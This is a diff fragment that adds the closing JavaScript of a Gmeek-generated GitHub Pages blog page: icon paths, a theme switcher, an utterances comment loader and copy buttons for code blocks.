+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
